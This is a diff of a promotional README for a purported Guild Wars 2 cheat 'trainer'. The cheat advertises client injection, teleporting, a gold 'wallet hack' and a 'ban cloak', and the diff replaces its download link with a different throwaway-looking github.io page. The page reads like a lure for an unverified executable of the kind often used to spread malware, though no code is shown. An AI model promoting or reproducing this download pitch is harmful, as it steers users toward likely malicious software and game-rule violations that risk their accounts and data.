@@ -4,7 +4,7 @@
 
 Grinding world-boss timers, slogging map completion, or chasing legendary mats can feel like swimming through honey. This all-in-one **Guild Wars 2 Trainer** injects super-powers straight into the 64-bit client, letting you zip, warp, and cash-rain your way across Tyria with zero frustration.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload18.bitbucket.io)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://Guild-Wars-2-Trainer-wufo3.github.io/.github)
 ---
 
 ## Product Description
@@ -39,9 +39,9 @@ ArenaNet’s MMO still bangs with living-world episodes, strike missions, and Wv
 | Build                                          | Cheat Depth               | UX Style                 | Extra Sauce                      |
 | ---------------------------------------------- | ------------------------- | ------------------------ | -------------------------------- |
 | **This Mod Menu**                              | 30+ live sliders & tweaks | Neon overlay, gamepad OK | Ban cloak, wallet hack           |
-| KX Trainer﻿              | \~20 presets              | Windowed panel           | Lacks gold editor, fixed hotkeys |
-| UnknownCheats CE Table﻿ | Teleport, fly, speed      | Raw script list          | Manual pointer scans each patch  |
-| gw2cc Custom Client﻿     | Full bot scripting        | Headless console         | Needs separate client install    |
+| KX Trainer              | \~20 presets              | Windowed panel           | Lacks gold editor, fixed hotkeys |
+| UnknownCheats CE Table | Teleport, fly, speed      | Raw script list          | Manual pointer scans each patch  |
+| gw2cc Custom Client     | Full bot scripting        | Headless console         | Needs separate client install    |
 
 If you want a click-and-clap solution without juggling Cheat Engine addresses or installing a second client, the mod menu wins every category.
 
